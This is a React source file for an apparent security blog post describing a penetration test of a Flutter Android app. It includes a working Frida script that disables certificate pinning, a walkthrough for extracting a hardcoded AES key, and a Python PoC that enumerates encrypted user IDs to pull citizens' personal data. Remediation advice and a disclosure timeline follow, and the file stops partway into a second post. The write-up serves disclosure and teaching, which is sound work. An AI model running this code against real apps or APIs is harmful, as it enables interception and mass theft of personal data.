import { useParams, Link, Navigate } from 'react-router-dom'
import { motion } from 'framer-motion'
import {
  ArrowLeft, Clock, Calendar, Shield,
  AlertTriangle, CheckCircle, Info, DollarSign, Bug,
} from 'lucide-react'
import clsx from 'clsx'
import { getPost } from '../data/posts'
import CodeBlock from '../components/CodeBlock'
import DirectoryTree from '../components/DirectoryTree'

/* ─── Shared prose components ─────────────────────────── */
function Callout({ type = 'info', title, children }) {
  const cfg = {
    info:    { icon: Info,          border: 'border-cyber-blue/40',  bg: 'bg-cyber-blue/5',  text: 'text-cyber-blue',  label: title || 'Note' },
    warning: { icon: AlertTriangle, border: 'border-yellow-500/40',  bg: 'bg-yellow-500/5',  text: 'text-yellow-400',  label: title || 'Warning' },
    success: { icon: CheckCircle,   border: 'border-cyber-green/40', bg: 'bg-cyber-green/5', text: 'text-cyber-green', label: title || 'Success' },
    danger:  { icon: AlertTriangle, border: 'border-cyber-red/40',   bg: 'bg-cyber-red/5',   text: 'text-cyber-red',   label: title || 'Critical' },
  }[type]
  const Icon = cfg.icon
  return (
    <div className={clsx('my-6 rounded-xl border overflow-hidden', cfg.border)}>
      <div className={clsx('px-4 py-2 flex items-center gap-2 border-b font-mono text-xs font-semibold', cfg.bg, cfg.text, cfg.border)}>
        <Icon className="w-3.5 h-3.5" />{cfg.label}
      </div>
      <div className={clsx('px-4 py-3 text-sm leading-relaxed', cfg.bg, cfg.text)}>{children}</div>
    </div>
  )
}

function H2({ children }) {
  return (
    <h2 className="text-xl font-bold text-white mt-12 mb-4 flex items-center gap-2.5 font-mono border-b border-cyber-border/40 pb-3">
      <span className="text-cyber-green text-base">#</span>{children}
    </h2>
  )
}
function H3({ children }) {
  return (
    <h3 className="text-base font-semibold text-cyber-blue mt-7 mb-3 font-mono flex items-center gap-2">
      <span className="text-gray-600">##</span>{children}
    </h3>
  )
}
function P({ children }) {
  return <p className="text-gray-400 text-sm leading-relaxed mb-4">{children}</p>
}
function IC({ children }) {
  return (
    <code className="px-1.5 py-0.5 rounded bg-cyber-surface border border-cyber-border font-mono text-xs text-cyber-green">
      {children}
    </code>
  )
}
function HttpBox({ label, content, type = 'request' }) {
  return (
    <div className={clsx('my-5 rounded-xl overflow-hidden border', type === 'request' ? 'border-cyber-blue/30' : 'border-cyber-green/30')}>
      <div className={clsx('px-4 py-2 font-mono text-xs font-semibold border-b', type === 'request' ? 'bg-cyber-blue/10 text-cyber-blue border-cyber-blue/20' : 'bg-cyber-green/10 text-cyber-green border-cyber-green/20')}>
        {label}
      </div>
      <pre className="p-4 font-mono text-xs text-gray-300 leading-loose overflow-x-auto bg-cyber-surface whitespace-pre-wrap break-all">
        {content}
      </pre>
    </div>
  )
}

/* ─── IDOR Post ─────────────────────────────────────── */
const BLUTTER_TREE = [
  {
    name: 'blutter_output/',
    type: 'dir',
    children: [
      {
        name: 'asm/',
        type: 'dir',
        annotation: 'disassembled Dart snapshot functions',
        children: [
          { name: 'snapshot_hash.txt', type: 'file', annotation: 'unique hash of this snapshot' },
          {
            name: 'libapp/',
            type: 'dir',
            children: [
              { name: '_.asm', type: 'file', annotation: 'top-level / anonymous functions' },
              { name: 'AesHelper/', type: 'dir', children: [
                { name: 'encrypt.asm', type: 'file' },
                { name: 'decrypt.asm', type: 'file' },
              ]},
              { name: 'UserRepository/', type: 'dir', children: [
                { name: 'getUserById.asm', type: 'file' },
              ]},
            ],
          },
        ],
      },
      {
        name: 'ida_scripts/',
        type: 'dir',
        children: [
          { name: 'addNames.py', type: 'file', annotation: 'IDA Pro symbol renaming script' },
        ],
      },
      {
        name: 'jadx_script/',
        type: 'dir',
        children: [
          { name: 'addNames.js', type: 'file', annotation: 'JADX deobfuscation script' },
        ],
      },
      { name: 'pp.txt', type: 'file', annotation: '⭐ all objects, classes & memory addresses' },
    ],
  },
]

function IDORPost() {
  return (
    <div className="text-gray-400 text-sm leading-relaxed">

      {/* ── Overview ─────────────────────────────── */}
      <div className="glass-card p-6 mb-8 border-l-4 border-cyber-red">
        <h3 className="font-mono font-bold text-white text-base mb-3 flex items-center gap-2">
          <AlertTriangle className="w-4 h-4 text-cyber-red" /> Executive Summary
        </h3>
        <P>
          During a freelance mobile application penetration test engagement, I identified a <span className="text-cyber-red font-semibold">Critical-severity Mass IDOR (Insecure Direct Object Reference)</span> vulnerability in the Android application's backend API. By reverse-engineering the application's Flutter shared library, extracting a hardcoded AES-128-CBC encryption key and IV, and decrypting sequential user identifiers, I was able to enumerate and retrieve the personal data of <span className="text-cyber-red font-semibold">approximately 4 million citizens</span> — including names, phone numbers, national IDs, and addresses — using a single authenticated session.
        </P>
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
          {[
            { label: 'Severity',   value: 'Critical',              color: '#ff4455' },
            { label: 'Type',       value: 'Mass IDOR',             color: '#00ff88' },
            { label: 'Platform',   value: 'Android / Flutter',     color: '#00cfff' },
            { label: 'Records',    value: '~4 Million',            color: '#ff4455' },
          ].map(({ label, value, color }) => (
            <div key={label} className="bg-cyber-bg/60 rounded-lg p-3 border border-cyber-border/40">
              <p className="font-mono text-xs text-gray-600 mb-1">{label}</p>
              <p className="font-mono text-xs font-bold" style={{ color }}>{value}</p>
            </div>
          ))}
        </div>
      </div>

      {/* ── Step 1 ─────────────────────────────── */}
      <H2>Step 1 — Analyzing the APK</H2>
      <P>
        The engagement began with static analysis of the Android application package. My first goal was to identify the underlying framework and map the application's internal structure before attempting any dynamic analysis or network interception.
      </P>
      <P>
        I extracted the APK contents using <IC>apktool</IC>, a powerful framework for reverse engineering Android applications. This tool decodes the APK back to its near-original form, including resources, manifest files, and native libraries.
      </P>

      <CodeBlock language="bash" filename="01_extract_apk.sh" code={`# Decompile the APK to inspect its contents
apktool d target_app.apk -o extracted_app/

# Navigate into the extracted directory
ls extracted_app/

# Output:
# AndroidManifest.xml  assets/  lib/  original/  res/  smali/  unknown/`} />

      <P>
        Inside the <IC>lib/</IC> directory, I discovered a telling structure. The presence of <IC>libflutter.so</IC> and <IC>libapp.so</IC> immediately indicated this was a <span className="text-cyber-blue font-semibold">Flutter application</span> — Google's cross-platform framework that compiles Dart code into native ARM shared libraries.
      </P>

      <CodeBlock language="bash" filename="02_inspect_libs.sh" code={`# Inspect the lib directory
find extracted_app/lib/ -name "*.so" | sort

# Output:
# extracted_app/lib/arm64-v8a/libapp.so
# extracted_app/lib/arm64-v8a/libflutter.so

# Confirm architecture and binary type
file extracted_app/lib/arm64-v8a/libapp.so

# Output:
# libapp.so: ELF 64-bit LSB shared object, ARM aarch64,
# version 1 (SYSV), dynamically linked, stripped`} />

      <Callout type="info" title="Why libapp.so Matters">
        In Flutter applications, <IC>libapp.so</IC> contains the compiled Dart snapshot — the entire application logic compiled to native ARM64 machine code. Unlike traditional Android apps, there is no readable Java bytecode (smali). All business logic, API keys, encryption parameters, and network communication code lives inside this binary.
      </Callout>

      {/* ── Step 2 ─────────────────────────────── */}
      <H2>Step 2 — Bypassing SSL Certificate Pinning</H2>
      <P>
        Flutter applications compiled with BoringSSL implement SSL certificate verification at the native level, making traditional Java-based certificate pinning bypass techniques ineffective. The TLS handshake is handled entirely within <IC>libflutter.so</IC>, which means we need to hook at the native layer.
      </P>
      <P>
        I set up a dynamic analysis environment using a <span className="text-cyber-blue font-semibold">MEmu Android Emulator</span> (x86_64 with ARM translation support), deployed <IC>frida-server</IC> onto the device, and wrote a custom Frida script to hook BoringSSL's internal SSL verification function.
      </P>

      <CodeBlock language="bash" filename="03_setup_frida.sh" code={`# Push frida-server to the emulator via ADB
adb push frida-server-16.x.x-android-x86_64 /data/local/tmp/frida-server

# Set executable permissions
adb shell chmod +x /data/local/tmp/frida-server

# Start frida-server in the background (as root)
adb shell "su -c '/data/local/tmp/frida-server &'"

# Verify frida-server is running
adb shell ps | grep frida

# List running apps to find target package name
frida-ps -U | grep -i target`} />

      <P>
        With Frida running, I injected the following script to patch the SSL verification routine inside <IC>libflutter.so</IC>. The key function to neutralize is <IC>ssl_verify_peer_cert</IC> — BoringSSL's internal certificate chain validator:
      </P>

      <CodeBlock language="javascript" filename="flutter_ssl_bypass.js" code={`/**
 * Flutter SSL Pinning Bypass via BoringSSL Hook
 * Hooks ssl_verify_peer_cert inside libflutter.so to always
 * return ssl_verify_ok (0), disabling certificate validation.
 */

function hookSSLVerify(libName) {
  const lib = Process.findModuleByName(libName);
  if (!lib) {
    console.log(\`[-] \${libName} not found, skipping...\`);
    return;
  }
  console.log(\`[+] Found \${libName} @ \${lib.base}\`);

  /**
   * Pattern for ssl_verify_peer_cert prologue in BoringSSL ARM64:
   * int ssl_verify_peer_cert(SSL_HANDSHAKE *hs)
   * Returns: ssl_verify_ok (0) on success, ssl_verify_invalid (1) on failure
   */
  const PATTERN = "FF 43 01 D1 FD 7B 04 A9 FD 03 01 91 F3 0B 00 F9";

  Memory.scan(lib.base, lib.size, PATTERN, {
    onMatch(address) {
      console.log(\`[+] ssl_verify_peer_cert found @ \${address}\`);

      Interceptor.replace(address, new NativeCallback(
        function (ssl_handshake_ptr) {
          console.log("[*] ssl_verify_peer_cert intercepted — returning ssl_verify_ok");
          return 0; // ssl_verify_ok
        },
        "int",    // return type
        ["pointer"] // args: SSL_HANDSHAKE*
      ));
    },
    onComplete() {
      console.log("[*] Memory scan complete for " + libName);
    },
  });
}

// Flutter bundles BoringSSL in libflutter.so
// Some builds also include SSL code in libapp.so
setTimeout(function () {
  hookSSLVerify("libflutter.so");
  hookSSLVerify("libapp.so");
}, 1000);`} />

      <CodeBlock language="bash" filename="04_inject_frida.sh" code={`# Inject the bypass script into the running app
frida -U -f com.target.app -l flutter_ssl_bypass.js --no-pause

# Expected output:
# [+] Found libflutter.so @ 0x7f8a000000
# [+] ssl_verify_peer_cert found @ 0x7f8a3c2d10
# [*] ssl_verify_peer_cert intercepted — returning ssl_verify_ok`} />

      <P>
        After injecting the script, I configured Burp Suite as the system proxy and began capturing HTTPS traffic from the application. SSL pinning was successfully bypassed.
      </P>

      <Callout type="success" title="Pinning Bypassed">
        Burp Suite was now intercepting all HTTPS requests from the Flutter app. The TLS certificate chain was accepted regardless of the issuer, allowing full visibility into the application's API communication.
      </Callout>

      {/* ── Step 3 ─────────────────────────────── */}
      <H2>Step 3 — Enumerating the Unofficial API</H2>
      <P>
        With traffic interception active, I began navigating the application and cataloguing every API endpoint. Most endpoints were standard authenticated calls, but one stood out immediately — a <IC>POST /get-user</IC> endpoint that fetched detailed user profile information.
      </P>
      <P>
        The request body contained a single parameter: <IC>user_id</IC>. However, the value was not a plaintext identifier — it appeared to be a Base64-encoded ciphertext. The application was encrypting the user ID before sending it to the server.
      </P>

      <HttpBox
        label="Intercepted Request — POST /get-user"
        type="request"
        content={`POST /api/v1/get-user HTTP/2
Host: api.target-app.com
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
User-Agent: Dart/3.0 (dart:io)
Content-Length: 44

user_id=RkQ5M2FhQjhYekxvUDNtY1ZodVUwQT09`}
      />

      <HttpBox
        label="Server Response — 200 OK"
        type="response"
        content={`HTTP/2 200 OK
Content-Type: application/json

{
  "status": "success",
  "data": {
    "user_id":    1,
    "full_name":  "Yousef Zain Aldeen",
    "national_id":"1234567890",
    "phone":      "+966-5X-XXX-XXXX",
    "address":    "Yanbu, Saudi Arabia",
    "dob":        "1999-01-01",
    "email":      "yousef@example.com"
  }
}`}
      />

      <Callout type="warning" title="Encryption ≠ Authorization">
        The server accepted <em>any</em> validly encrypted user ID — regardless of whether the requesting user had authorization to view that account. There was no server-side ownership or permission check. Encryption was used purely as obfuscation, not as a security control.
      </Callout>

      <P>
        The immediate hypothesis was that the user IDs were sequential integers — if I could decrypt my own <IC>user_id</IC>, determine the format, and re-encrypt an arbitrary integer, I could fetch any account. The challenge: finding the encryption key and IV embedded inside <IC>libapp.so</IC>.
      </P>

      {/* ── Step 4 ─────────────────────────────── */}
      <H2>Step 4 — Reverse Engineering with Blutter</H2>
      <H3>What Is Blutter?</H3>
      <P>
        <span className="text-cyber-blue font-semibold">Blutter</span> is an open-source static analysis tool specifically designed for Flutter applications. Because Flutter compiles Dart code into native ARM64 snapshots (inside <IC>libapp.so</IC>), traditional decompilers like JADX cannot parse it. Blutter solves this by understanding the Dart snapshot format: it reconstructs class names, method names, object references, and memory addresses from the binary — producing human-readable output that makes reverse engineering tractable.
      </P>
      <P>
        It is particularly powerful for finding hardcoded strings, encryption keys, API endpoints, and business logic that would otherwise require deep manual ARM64 disassembly.
      </P>

      <CodeBlock language="bash" filename="05_blutter_setup.sh" code={`# Clone Blutter from GitHub
git clone https://github.com/worawit/blutter.git
cd blutter

# Install Python dependencies
pip3 install -r requirements.txt

# Build Blutter (requires cmake, ninja, and libzip)
# On Linux/macOS:
python3 setup.py

# On Windows (with Visual Studio Build Tools):
python3 setup.py --vs`} />

      <CodeBlock language="bash" filename="06_run_blutter.sh" code={`# Run Blutter against the extracted arm64 library
# Syntax: blutter.py <path_to_libapp.so> <arch> <output_dir>

python3 blutter.py \\
  /path/to/extracted_app/lib/arm64-v8a/libapp.so \\
  arm64 \\
  blutter_output/

# Blutter will analyze the snapshot and generate:
# - Assembly files (.asm) for every Dart class/method
# - IDA Pro and JADX helper scripts
# - pp.txt — a full object/class dump with memory addresses`} />

      <P>The output directory structure generated by Blutter:</P>

      <DirectoryTree title="blutter_output/ — Generated File Tree" tree={BLUTTER_TREE} />

      <H3>Mining pp.txt for the Encryption Key</H3>
      <P>
        The most valuable output from Blutter is <IC>pp.txt</IC>. It lists every Dart object created in the application — including string constants — alongside their memory addresses. I searched this file for AES-related strings:
      </P>

      <CodeBlock language="bash" filename="07_find_aes_key.sh" code={`# Search pp.txt for AES-related strings
grep -i "aes" blutter_output/pp.txt

# Sample output (redacted):
# 0x00ab1234  String: "AES/CBC/PKCS7"
# 0x00ab1248  String: "Hx7Kp2Qm9Nw3Rz6Y"        <-- KEY (16 bytes)
# 0x00ab125c  String: "Jv4Ls8Ft1Ue5Xb0D"        <-- IV  (16 bytes)
# 0x00ab1270  String: "AesEncryptionHelper"

# Also search for the class that uses these values
grep -i "encrypt" blutter_output/pp.txt | head -20`} />

      <P>
        Three consecutive string entries appeared near references to an <IC>AesEncryptionHelper</IC> class:
      </P>

      <div className="my-5 glass-card overflow-hidden">
        <div className="px-4 py-2.5 bg-cyber-bg/60 border-b border-cyber-border font-mono text-xs text-gray-400">
          pp.txt — relevant excerpt
        </div>
        <div className="p-4 font-mono text-xs leading-loose overflow-x-auto">
          <div className="whitespace-nowrap"><span className="text-gray-600">0x00ab1234  </span><span className="text-cyber-purple">String</span><span className="text-gray-500">: </span><span className="text-cyber-green">"AES/CBC/PKCS7"</span>            <span className="text-gray-600">// cipher suite</span></div>
          <div className="whitespace-nowrap"><span className="text-gray-600">0x00ab1248  </span><span className="text-cyber-purple">String</span><span className="text-gray-500">: </span><span className="text-cyber-red">"Hx7Kp2Qm9Nw3Rz6Y"</span>        <span className="text-gray-600">// AES-128 key (16 bytes) ⭐</span></div>
          <div className="whitespace-nowrap"><span className="text-gray-600">0x00ab125c  </span><span className="text-cyber-purple">String</span><span className="text-gray-500">: </span><span className="text-cyber-red">"Jv4Ls8Ft1Ue5Xb0D"</span>        <span className="text-gray-600">// IV (16 bytes) ⭐</span></div>
          <div className="whitespace-nowrap"><span className="text-gray-600">0x00ab1270  </span><span className="text-cyber-purple">Type</span><span className="text-gray-500">:   </span><span className="text-cyber-blue">AesEncryptionHelper</span>        <span className="text-gray-600">// class reference</span></div>
        </div>
      </div>

      <Callout type="danger" title="Hardcoded Credentials">
        The AES-128-CBC secret key and initialization vector were hardcoded directly inside the compiled Dart snapshot. Any attacker with access to the APK could extract these within minutes using Blutter — completely undermining the encryption's purpose.
      </Callout>

      {/* ── Step 5 ─────────────────────────────── */}
      <H2>Step 5 — Decrypting &amp; Re-Encrypting User IDs</H2>
      <P>
        With the key and IV extracted, I wrote a Python script to decrypt the intercepted <IC>user_id</IC> ciphertext and re-encrypt arbitrary integer values. I used the <IC>pycryptodome</IC> library, which supports AES-128-CBC with PKCS#7 padding — matching the cipher suite found in <IC>pp.txt</IC>.
      </P>

      <CodeBlock language="python" filename="aes_helper.py" code={`#!/usr/bin/env python3
"""
AES-128-CBC Encrypt / Decrypt helper
Mirrors the AesEncryptionHelper class extracted from libapp.so
"""

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# Extracted from pp.txt via Blutter — REDACTED in public disclosure
AES_KEY = b"Hx7Kp2Qm9Nw3Rz6Y"   # 16 bytes → AES-128
AES_IV  = b"Jv4Ls8Ft1Ue5Xb0D"   # 16 bytes


def encrypt_user_id(user_id: int) -> str:
    """
    Encrypt an integer user ID to produce the Base64 ciphertext
    expected by the /get-user endpoint.
    """
    plaintext = str(user_id).encode("utf-8")
    cipher    = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    ct_bytes  = cipher.encrypt(pad(plaintext, AES.block_size))
    return base64.b64encode(ct_bytes).decode("utf-8")


def decrypt_user_id(b64_ciphertext: str) -> str:
    """
    Decrypt the Base64-encoded ciphertext returned by the app.
    """
    ct_bytes  = base64.b64decode(b64_ciphertext)
    cipher    = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    plaintext = unpad(cipher.decrypt(ct_bytes), AES.block_size)
    return plaintext.decode("utf-8")


# ── Quick validation ────────────────────────────────────
if __name__ == "__main__":
    # Decrypt our own intercepted ciphertext to verify the key
    captured = "RkQ5M2FhQjhYekxvUDNtY1ZodVUwQT09"
    uid_plain = decrypt_user_id(captured)
    print(f"[+] Decrypted user_id: {uid_plain}")   # → 1

    # Re-encrypt a different ID
    for test_id in [1, 2, 1000, 4000000]:
        enc = encrypt_user_id(test_id)
        dec = decrypt_user_id(enc)
        assert dec == str(test_id), "Round-trip mismatch!"
        print(f"    ID {test_id:>8} → {enc}")`} />

      <CodeBlock language="bash" filename="run_aes_helper.sh" code={`python3 aes_helper.py

# Output:
# [+] Decrypted user_id: 1
#     ID        1 → RkQ5M2FhQjhYekxvUDNtY1ZodVUwQT09
#     ID        2 → aGVsbG8yd29ybGQ5M2FhQjhYekx...
#     ID     1000 → ZnVuY3Rpb25MaXN0ZW5lckhvc3Q...
#     ID  4000000 → c2VjcmV0S2V5SXZQYXJhbWV0ZXI...`} />

      <Callout type="danger" title="Sequential IDs Confirmed">
        Decrypting my own session's <IC>user_id</IC> returned <IC>1</IC>. After creating a second test account and decrypting its ID, the result was <IC>2</IC>. The IDs were sequential integers starting from 1 and reaching at least <IC>4,000,000</IC> — the total number of registered users reported in the app's public marketing materials.
      </Callout>

      {/* ── Step 6 ─────────────────────────────── */}
      <H2>Step 6 — Mass IDOR Exploitation</H2>
      <P>
        With sequential IDs and a working encrypt/decrypt pipeline, I developed a proof-of-concept exploitation script to demonstrate the full impact. I limited the demonstration to <span className="text-cyber-red font-semibold">50 accounts</span> to avoid causing harm and immediately reported after confirming the vulnerability.
      </P>

      <CodeBlock language="python" filename="mass_idor_poc.py" code={`#!/usr/bin/env python3
"""
Mass IDOR Proof-of-Concept — Educational Demonstration Only
Target: POST /api/v1/get-user
Vulnerability: No authorization check on user_id parameter

IMPORTANT: This script was used ONLY for controlled PoC demonstration
against 50 accounts with client authorization. Unauthorized use is illegal.
"""

import requests
import json
import time
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# ── Configuration ───────────────────────────────────────
API_BASE   = "https://api.example.com"
ENDPOINT   = f"{API_BASE}/api/v1/get-user"
AUTH_TOKEN = "<YOUR_JWT_TOKEN>"          # Valid session token
AES_KEY    = b"Hx7Kp2Qm9Nw3Rz6Y"       # Extracted from libapp.so
AES_IV     = b"Jv4Ls8Ft1Ue5Xb0D"       # Extracted from libapp.so
MAX_ID     = 50                          # PoC: limit to 50 for demo
DELAY_SEC  = 0.3                         # Rate limiting — be responsible

HEADERS = {
    "Authorization":  f"Bearer {AUTH_TOKEN}",
    "Content-Type":   "application/x-www-form-urlencoded",
    "User-Agent":     "Dart/3.0 (dart:io)",
    "Accept":         "application/json",
}


# ── Crypto helpers ──────────────────────────────────────
def encrypt_id(user_id: int) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    ct     = cipher.encrypt(pad(str(user_id).encode(), AES.block_size))
    return base64.b64encode(ct).decode()


# ── Exploitation loop ───────────────────────────────────
def run_poc():
    leaked   = []
    errors   = 0

    print(f"[*] Starting Mass IDOR PoC — targeting IDs 1 to {MAX_ID}")
    print(f"[*] Endpoint: {ENDPOINT}\\n{'─'*60}")

    for uid in range(1, MAX_ID + 1):
        encrypted_id = encrypt_id(uid)
        try:
            resp = requests.post(
                ENDPOINT,
                headers=HEADERS,
                data={"user_id": encrypted_id},
                timeout=10,
                verify=False,           # Frida already handles TLS
            )

            if resp.status_code == 200:
                data = resp.json().get("data", {})
                leaked.append(data)
                print(
                    f"  [+] ID {uid:>7} | "
                    f"{data.get('full_name','?'):<25} | "
                    f"{data.get('phone','?'):<18} | "
                    f"{data.get('national_id','?')}"
                )
            elif resp.status_code == 404:
                print(f"  [-] ID {uid:>7} | Not found")
            else:
                print(f"  [!] ID {uid:>7} | HTTP {resp.status_code}")
                errors += 1

        except requests.RequestException as e:
            print(f"  [E] ID {uid:>7} | {e}")
            errors += 1

        time.sleep(DELAY_SEC)

    # ── Save results ────────────────────────────────────
    output_file = "idor_poc_results.json"
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(leaked, f, indent=2, ensure_ascii=False)

    print(f"\\n{'─'*60}")
    print(f"[!] PoC complete — {len(leaked)} records extracted, {errors} errors")
    print(f"[!] Results saved to {output_file}")
    print(f"[!] Extrapolated full exposure: ~4,000,000 citizens")
    return leaked


if __name__ == "__main__":
    run_poc()`} />

      <H3>PoC Output (Redacted)</H3>
      <CodeBlock language="bash" filename="poc_output.txt" code={`[*] Starting Mass IDOR PoC — targeting IDs 1 to 50
[*] Endpoint: https://api.example.com/api/v1/get-user
────────────────────────────────────────────────────────────
  [+] ID       1 | Yousef Zain Aldeen        | +966-5X-XXX-0001 | 10XXXXXXXX01
  [+] ID       2 | [REDACTED]                | +966-5X-XXX-0002 | 10XXXXXXXX02
  [+] ID       3 | [REDACTED]                | +966-5X-XXX-0003 | 10XXXXXXXX03
  ...
  [+] ID      50 | [REDACTED]                | +966-5X-XXX-0050 | 10XXXXXXXX50
────────────────────────────────────────────────────────────
[!] PoC complete — 50 records extracted, 0 errors
[!] Results saved to idor_poc_results.json
[!] Extrapolated full exposure: ~4,000,000 citizens`} />

      <Callout type="success" title="Vulnerability Confirmed — Reported Immediately">
        After confirming the vulnerability with 50 accounts, I immediately halted the test and prepared a detailed report for the client including this full technical writeup, CVSS score, and remediation guidance. No data was retained beyond what was necessary to demonstrate the vulnerability.
      </Callout>

      {/* ── Impact ─────────────────────────────── */}
      <H2>Impact Assessment</H2>
      <div className="glass-card overflow-hidden my-5">
        <div className="px-5 py-3 bg-cyber-red/10 border-b border-cyber-red/20 font-mono text-xs text-cyber-red font-semibold">
          CVSS v3.1 Score: 9.8 CRITICAL
        </div>
        <div className="p-5 space-y-3">
          {[
            { label: 'Attack Vector',       value: 'Network',      color: '#ff4455' },
            { label: 'Attack Complexity',   value: 'Low',          color: '#ff4455' },
            { label: 'Privileges Required', value: 'Low',          color: '#facc15' },
            { label: 'User Interaction',    value: 'None',         color: '#ff4455' },
            { label: 'Scope',               value: 'Unchanged',    color: '#9ca3af' },
            { label: 'Confidentiality',     value: 'High',         color: '#ff4455' },
            { label: 'Integrity',           value: 'None',         color: '#9ca3af' },
            { label: 'Availability',        value: 'None',         color: '#9ca3af' },
          ].map(({ label, value, color }) => (
            <div key={label} className="flex items-center justify-between py-1.5 border-b border-cyber-border/20 last:border-0">
              <span className="font-mono text-xs text-gray-500">{label}</span>
              <span className="font-mono text-xs font-bold" style={{ color }}>{value}</span>
            </div>
          ))}
        </div>
      </div>

      <P>The confirmed impact of this vulnerability, if exploited maliciously:</P>
      <ul className="space-y-2 mb-6 ml-2">
        {[
          'Exfiltration of PII for ~4 million citizens (names, national IDs, phone numbers, addresses, dates of birth)',
          'Identity theft and social engineering attacks against affected users',
          'Regulatory and legal liability under national data protection legislation',
          'Reputational damage to the client organization and loss of user trust',
          'Potential for targeted phishing, SIM-swap fraud, and financial fraud at scale',
        ].map((item, i) => (
          <li key={i} className="flex items-start gap-2 text-sm text-gray-400">
            <span className="text-cyber-red mt-1 flex-shrink-0">→</span>
            <span>{item}</span>
          </li>
        ))}
      </ul>

      {/* ── Recommendations ─────────────────────── */}
      <H2>Recommendations &amp; Remediation</H2>
      <div className="space-y-3 mb-6">
        {[
          {
            num: '01',
            title: 'Enforce Server-Side Authorization',
            desc: 'Every request to /get-user must verify that the authenticated user\'s session token matches the requested user_id. The server must never trust a client-supplied identifier alone.',
            priority: 'P0 — Immediate',
            color: '#ff4455',
          },
          {
            num: '02',
            title: 'Replace Symmetric Encryption with Opaque Tokens',
            desc: 'Replace sequential integer IDs with UUIDs (v4) or HMAC-signed tokens. Symmetric encryption with a hardcoded key is not an authorization mechanism.',
            priority: 'P0 — Immediate',
            color: '#ff4455',
          },
          {
            num: '03',
            title: 'Remove Hardcoded Cryptographic Material',
            desc: 'Encryption keys and IVs must never be compiled into the application binary. Use server-side key derivation, certificate-bound tokens, or a secure key management service.',
            priority: 'P1 — Short Term',
            color: '#facc15',
          },
          {
            num: '04',
            title: 'Implement Rate Limiting & Anomaly Detection',
            desc: 'Apply rate limiting on sensitive endpoints. Flag and alert on unusual enumeration patterns (e.g., sequential parameter values, high-frequency single-user requests).',
            priority: 'P1 — Short Term',
            color: '#facc15',
          },
          {
            num: '05',
            title: 'Upgrade to IMDSv2-Equivalent API Token Binding',
            desc: 'Bind API responses to the authenticated session rather than a standalone encrypted parameter. Implement short-lived, per-request tokens for sensitive data access.',
            priority: 'P2 — Medium Term',
            color: '#00cfff',
          },
        ].map(({ num, title, desc, priority, color }) => (
          <div key={num} className="glass-card p-4 flex gap-4">
            <div className="font-mono text-2xl font-bold opacity-20 flex-shrink-0 w-8">{num}</div>
            <div className="flex-1">
              <div className="flex items-start justify-between gap-3 mb-1.5">
                <h4 className="font-mono font-semibold text-white text-sm">{title}</h4>
                <span className="font-mono text-xs px-2 py-0.5 rounded-full border flex-shrink-0" style={{ color, borderColor: color + '50', backgroundColor: color + '10' }}>
                  {/* Abbreviated on mobile, full label on sm+ */}
                  <span className="sm:hidden">{priority.split(' — ')[0]}</span>
                  <span className="hidden sm:inline">{priority}</span>
                </span>
              </div>
              <p className="text-xs text-gray-500 leading-relaxed">{desc}</p>
            </div>
          </div>
        ))}
      </div>

      {/* ── Timeline ─────────────────────────────── */}
      <H2>Disclosure Timeline</H2>
      <div className="glass-card overflow-hidden my-5">
        {[
          { date: 'Day 1',  event: 'APK extraction and framework identification (Flutter confirmed)', color: 'text-gray-400' },
          { date: 'Day 2',  event: 'SSL pinning bypassed via Frida — traffic interception active',   color: 'text-cyber-blue' },
          { date: 'Day 2',  event: 'Suspicious encrypted user_id parameter identified',              color: 'text-cyber-blue' },
          { date: 'Day 3',  event: 'libapp.so reverse-engineered with Blutter — AES key/IV found',  color: 'text-cyber-green' },
          { date: 'Day 3',  event: 'Sequential IDs confirmed — Mass IDOR vulnerability established', color: 'text-cyber-red' },
          { date: 'Day 3',  event: 'PoC halted at 50 records — full report drafted and delivered',  color: 'text-cyber-green' },
          { date: 'Day 7',  event: 'Client confirmed receipt and initiated emergency patch',         color: 'text-yellow-400' },
          { date: 'Day 14', event: 'Authorization checks deployed to production',                    color: 'text-cyber-green' },
          { date: 'Day 21', event: 'Hardcoded key removed; server-side token system implemented',    color: 'text-cyber-green' },
        ].map(({ date, event, color }, i) => (
          <div key={i} className="flex items-start gap-4 px-5 py-3 border-b border-cyber-border/20 last:border-0 hover:bg-cyber-bg/30 transition-colors">
            <span className="font-mono text-xs text-gray-600 w-12 flex-shrink-0">{date}</span>
            <span className={`font-mono text-xs ${color}`}>{event}</span>
          </div>
        ))}
      </div>

      {/* ── Conclusion ───────────────────────────── */}
      <H2>Conclusion</H2>
      <P>
        This engagement is a textbook example of how multiple security weaknesses compound into a catastrophic vulnerability. In isolation, each finding seems moderate: an API that accepts user-supplied identifiers, an AES-encrypted parameter, a compiled mobile application. But when chained together — a hardcoded encryption key extractable via static analysis, sequential predictable IDs, and a complete absence of server-side authorization — the result is a single-authenticated-request attack that could expose the entire user database.
      </P>
      <P>
        Encryption is not authorization. The application's designers likely believed that encrypting the <IC>user_id</IC> would prevent tampering, but without verifying <em>who</em> is asking for <em>which</em> record on the server side, the encryption provides zero access control benefit — especially when the key lives inside the very binary an attacker already possesses.
      </P>
      <P>
        This underscores a foundational principle of secure API design: <span className="text-cyber-green font-semibold">never trust any client-supplied identifier without server-side ownership verification</span>. Every sensitive data request must be validated against the authenticated session, regardless of how the identifier is formatted or encoded.
      </P>

      <Callout type="info" title="Tools Used in This Assessment">
        <span className="flex flex-wrap gap-2 mt-1">
          {['Apktool', 'Frida', 'Blutter', 'Burp Suite', 'MEmu Emulator', 'ADB', 'Python 3', 'pycryptodome'].map(t => (
            <IC key={t}>{t}</IC>
          ))}
        </span>
      </Callout>

    </div>
  )
}

/* ─── Nafath Bypass Post ────────────────────────────── */
function NafathBypassPost() {
  return (
    <div className="text-gray-400 text-sm leading-relaxed">

      {/* ── Overview ─────────────────────────────── */}
      <div className="glass-card p-5 sm:p-6 mb-8 border-l-4 border-cyber-red">
        <h3 className="font-mono font-bold text-white text-base mb-3 flex items-center gap-2">
          <AlertTriangle className="w-4 h-4 text-cyber-red" /> Executive Summary
        </h3>
        <P>
